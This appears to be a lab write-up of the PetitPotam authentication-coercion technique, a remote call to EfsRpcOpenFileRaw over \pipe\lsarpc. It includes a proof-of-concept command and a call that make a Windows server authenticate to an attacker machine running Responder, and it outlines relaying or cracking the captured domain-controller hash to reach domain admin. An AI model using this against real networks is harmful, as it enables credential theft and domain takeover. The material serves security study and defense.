# MS-EFSR - Remote call to EfsRpcOpenFileRaw (opnum 0)

## Summary

 - **Protocol**: [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

 - **Protocol UUID**: c681d488-d850-11d0-8c52-00c04fd90f7e

 - **Protocol version**: 1.0

 - **SMB Named pipes**: `\pipe\lsarpc`, `\pipe\efsrpc`

 - **Function name**: [`EfsRpcOpenFileRaw`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)

 - **Function operation number**: `0`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\pipe\lsarpc` and bind to the desired [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol (with uuid `c681d488-d850-11d0-8c52-00c04fd90f7e` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\lsarpc`. This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. It will then call the remote [`EfsRpcOpenFileRaw`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) function on the Windows Server (192.168.2.1) with the following parameters:

```cpp
EfsRpcOpenFileRaw("\\\\192.168.2.51\\share\\file.txt\x00", 1)
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\NETLOGON` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!

---

## Function technical detail

```cpp
long EfsRpcOpenFileRaw(
    [in] handle_t binding_h,
    [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
    [in, string] wchar_t* FileName,
    [in] long Flags
);
```

 - **binding_h**: An explicit binding handle created by the client. This is an RPC binding handle parameter, as specified in [C706] and [MS-RPCE] section 2.


 - **hContext**: An implementation-specific context handle that is used in subsequent calls by the client to the EfsRpcReadFileRaw method, EfsRpcWriteFileRaw method, or EfsRpcCloseRaw method.


 - **FileName**: An EFSRPC identifier, as specified in section 2.2.1.


 - **Flags**: This MUST be set to some combination of the following values. All servers and clients MUST support the CREATE_FOR_IMPORT flag. Servers that implement a hierarchical encrypted store, such as the NTFS file system, SHOULD also support the CREATE_FOR_DIR flag. Servers SHOULD support the OVERWRITE_HIDDEN flag, and MAY interpret it in implementation-specific ways. A client MUST ensure that all the flags it does not support are set to zero. A server MUST ignore all flags it does not support. Flag values are specified in the following table.
 
| Name | Value | Description |
|---|---|---|
| `CREATE_FOR_IMPORT` | `0x00000001` | Open the object for writing (that is, restore). If this flag is not set, open the object for reading (that is, backup). |
| `CREATE_FOR_DIR` | `0x00000002` | This flag is only intended for use in conjunction with the CREATE_FOR_IMPORT flag. It indicates that the object being restored is a container for other objects.<42> |
| `OVERWRITE_HIDDEN` | `0x00000004` | This flag is only intended for use in conjunction with the CREATE_FOR_IMPORT flag. This flag indicates a request from the client for the server to overwrite an existing object even if the existing object is "hidden". The meaning of "hidden" is specific to the implementation of the data store, and this meaning does not affect protocol behavior. |
| `EFS_DROP_ALTERNATE_STREAMS` | `0x00000010` | This flag indicates that content from any alternate data streams, if present and implemented by the storage system, will be ignored. |


## References

 - Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31


 - Documentation of function `EfsRpcOpenFileRaw`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8


 - CVE-2021-36942 Windows LSA Spoofing Vulnerability: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942


 - This call was pointed out by [@topotam77](https://twitter.com/topotam77/) on Jul 18, 2021: https://twitter.com/topotam77/status/1416833996923809793